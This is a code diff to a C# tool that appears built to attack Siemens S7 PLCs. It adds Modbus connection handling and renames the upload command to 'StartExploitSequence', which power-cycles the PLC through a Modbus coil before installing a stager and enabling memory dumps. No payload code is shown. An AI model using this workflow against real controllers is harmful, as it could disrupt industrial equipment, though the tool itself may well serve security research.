@@ -142,6 +142,34 @@ namespace S7_Csharp_Utility.ViewModels
         /// </summary>
         public ICommand PowerOffCommand { get; }
 
+        private string _modbusStatus = "Disconnected";
+        /// <summary>
+        /// The current status of the Modbus connection.
+        /// </summary>
+        public string ModbusStatus
+        {
+            get => _modbusStatus;
+            set
+            {
+                _modbusStatus = value;
+                OnPropertyChanged();
+                (ConnectModbusCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
+                (DisconnectModbusCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
+                (PowerOnCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
+                (PowerOffCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
+                (StartExploitSequenceCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
+            }
+        }
+
+        /// <summary>
+        /// Command to connect to the Modbus host.
+        /// </summary>
+        public ICommand ConnectModbusCommand { get; }
+        /// <summary>
+        /// Command to disconnect from the Modbus host.
+        /// </summary>
+        public ICommand DisconnectModbusCommand { get; }
+
         /// <summary>
         /// The service responsible for managing stager and dumper payloads.
         /// </summary>
@@ -190,7 +218,7 @@ namespace S7_Csharp_Utility.ViewModels
             {
                 _isUploadingStager = value;
                 OnPropertyChanged();
-                (UploadStagerCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
+                (StartExploitSequenceCommand as Commands.RelayCommand)?.RaiseCanExecuteChanged();
             }
         }
 
@@ -342,9 +370,9 @@ namespace S7_Csharp_Utility.ViewModels
         public ICommand SavePathsCommand { get; }
 
         /// <summary>
-        /// Command to upload the stager to the PLC.
+        /// Command to start the exploit sequence.
         /// </summary>
-        public ICommand UploadStagerCommand { get; }
+        public ICommand StartExploitSequenceCommand { get; }
         /// <summary>
         /// Command to dump memory from the PLC.
         /// </summary>
@@ -626,9 +654,12 @@ namespace S7_Csharp_Utility.ViewModels
             _socatService = socatService;
             _configService = configService;
 
-            PowerOnCommand = new Commands.RelayCommand(async _ => await _powerController.SetPowerAsync(ModbusHost, ModbusPort, ModbusCoil, true, ModbusSlaveId));
-            PowerOffCommand = new Commands.RelayCommand(async _ => await _powerController.SetPowerAsync(ModbusHost, ModbusPort, ModbusCoil, false, ModbusSlaveId));
-            UploadStagerCommand = new Commands.RelayCommand(async _ => await UploadStager(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
+            ConnectModbusCommand = new Commands.RelayCommand(async _ => await ConnectModbusAsync(), _ => ModbusStatus != "Connected");
+            DisconnectModbusCommand = new Commands.RelayCommand(_ => DisconnectModbus(), _ => ModbusStatus == "Connected");
+
+            PowerOnCommand = new Commands.RelayCommand(async _ => await _powerController.SetPowerAsync(ModbusCoil, true, ModbusSlaveId), _ => _powerController.IsConnected);
+            PowerOffCommand = new Commands.RelayCommand(async _ => await _powerController.SetPowerAsync(ModbusCoil, false, ModbusSlaveId), _ => _powerController.IsConnected);
+            StartExploitSequenceCommand = new Commands.RelayCommand(async _ => await StartExploitSequence(), _ => SocatStatus == "Running" && _powerController.IsConnected && !IsUploadingStager && !IsDumpingMemory && !IsComparing);
             DumpMemoryCommand = new Commands.RelayCommand(async _ => await DumpMemory(), _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing && StagerInstalled);
 
             BrowsePayloadsFolderCommand = new Commands.RelayCommand(async _ => { var result = await _dialogService.OpenFolderPickerAsync("Select Payloads Folder"); if(result != null) PayloadsPath = result; }, _ => !IsUploadingStager && !IsDumpingMemory && !IsComparing);
@@ -671,18 +702,18 @@ namespace S7_Csharp_Utility.ViewModels
         }
 
         /// <summary>
-        /// Uploads the stager to the PLC after power cycling the device.
+        /// Starts the exploit sequence, which includes power cycling the PLC and installing the stager.
         /// </summary>
-        private async Task UploadStager()
+        private async Task StartExploitSequence()
         {
             IsUploadingStager = true;
             S7.Net.Interfaces.ICommunicationChannel? channel = null;
             try
             {
-                await _powerController.SetPowerAsync(ModbusHost, ModbusPort, ModbusCoil, false);
+                await _powerController.SetPowerAsync(ModbusCoil, false, ModbusSlaveId);
                 Logging.Log($"Waiting for {DelaySeconds} seconds before powering on...", LogCategory.Info);
                 await Task.Delay(DelaySeconds * 1000);
-                await _powerController.SetPowerAsync(ModbusHost, ModbusPort, ModbusCoil, true);
+                await _powerController.SetPowerAsync(ModbusCoil, true, ModbusSlaveId);
 
                 await Task.Delay(50);
 
@@ -893,6 +924,27 @@ namespace S7_Csharp_Utility.ViewModels
                 Logging.Log($"Error stopping socat: {ex.Message}", LogCategory.Error);
                 await _dialogService.ShowMessageAsync("Error", $"Error stopping socat: {ex.Message}");
             }
+        }
+
+        private async Task ConnectModbusAsync()
+        {
+            try
+            {
+                await _powerController.ConnectAsync(ModbusHost, ModbusPort);
+                ModbusStatus = _powerController.IsConnected ? "Connected" : "Error";
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Error connecting to Modbus: {ex.Message}", LogCategory.Error);
+                await _dialogService.ShowMessageAsync("Error", $"Error connecting to Modbus: {ex.Message}");
+                ModbusStatus = "Error";
+            }
+        }
+
+        private void DisconnectModbus()
+        {
+            _powerController.Disconnect();
+            ModbusStatus = "Disconnected";
         }
 
         /// <summary>
